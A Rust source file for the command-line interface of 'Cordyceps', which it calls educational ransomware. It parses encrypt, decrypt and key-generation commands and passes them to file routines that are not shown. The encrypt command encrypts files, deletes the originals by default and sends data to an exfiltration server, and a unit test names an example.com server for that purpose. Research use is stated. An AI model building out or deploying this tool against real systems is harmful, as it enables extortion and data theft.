//! CLI parsing and mode dispatch logic.
//!
//! This module handles all command-line interface logic, including argument
//! parsing and delegation to encryption or decryption routines.

use clap::Parser;
use log::{debug, info};
use std::path::PathBuf;

use crate::{
    error::AppError,
    fsutils::{disinfect, germinate, sporulate},
};

/// Cordyceps' commands
#[derive(Parser, Debug)]
#[command(
    author = env!("CARGO_PKG_AUTHORS"),
    version = env!("CARGO_PKG_VERSION"),
    about = env!("CARGO_PKG_DESCRIPTION"),
    long_about = "Cordyceps is an educational ransomware designed for academic and research purposes."
)]
enum Cli {
    Encrypt(EncryptArgs),
    Decrypt(DecryptArgs),
    Generate(GenerateArgs),
}

#[derive(Parser, Debug)]
#[command(about = "Encrypts and exfiltrates files in .zombie format")]
struct EncryptArgs {
    /// Root directory
    #[arg(short = 'p', long, default_value = ".")]
    path: PathBuf,

    /// Main public key path
    #[arg(short = 'k', long, default_value = "main-public.key")]
    key: PathBuf,

    /// Do not delete original files after encryption
    #[arg(short = 'n', long)]
    no_delete: bool,

    /// Server address for exfiltration
    #[arg(short = 's', long)]
    server: Option<String>,
}

#[derive(Parser, Debug)]
#[command(about = "Restores encrypted .zombie files with a private key")]
struct DecryptArgs {
    /// Root directory
    #[arg(short = 'p', long, default_value = ".")]
    path: PathBuf,

    /// Path to the main private key
    #[arg(short = 'k', long, default_value = "main-private.key")]
    key: PathBuf,

    /// Do not delete .zombie files after decryption
    #[arg(short = 'n', long)]
    no_delete: bool,
}

#[derive(Parser, Debug)]
#[command(about = "Generate new main key pair")]
struct GenerateArgs {
    /// Path to store the key pair
    #[arg(short = 'p', long, default_value = ".")]
    path: PathBuf,
}

/// Parses CLI arguments and executes the appropriate application mode
/// (encrypt or decrypt).
///
/// This function serves as the entry point for command-line interaction.
/// It determines the mode selected by the user and delegates to the
/// corresponding logic.
pub fn run() -> Result<(), AppError> {
    let args = match Cli::try_parse() {
        Ok(args) => args,
        Err(e) => e.exit(),
    };

    info!("Arguments parsed and loaded");
    debug!("Arguments: {:?}", args);

    match args {
        Cli::Encrypt(args) => sporulate(&args.path, &args.key, args.no_delete, &args.server),
        Cli::Decrypt(args) => disinfect(&args.path, &args.key, args.no_delete),
        Cli::Generate(args) => germinate(&args.path),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use clap::Parser;

    #[test]
    fn test_encrypt_args_parsing() {
        let args = Cli::parse_from([
            "app",
            "encrypt",
            "-p",
            "/tmp",
            "-k",
            "/var/main-public.key",
            "-n",
            "-s",
            "http://example.com:2673",
        ]);

        if let Cli::Encrypt(args) = args {
            assert_eq!(args.path.to_str().unwrap(), "/tmp");
            assert_eq!(args.key.to_str().unwrap(), "/var/main-public.key");
            assert!(args.no_delete);
            assert_eq!(args.server, Some("http://example.com:2673".to_string()));
        } else {
            panic!("Expected encrypt args");
        }
    }
}
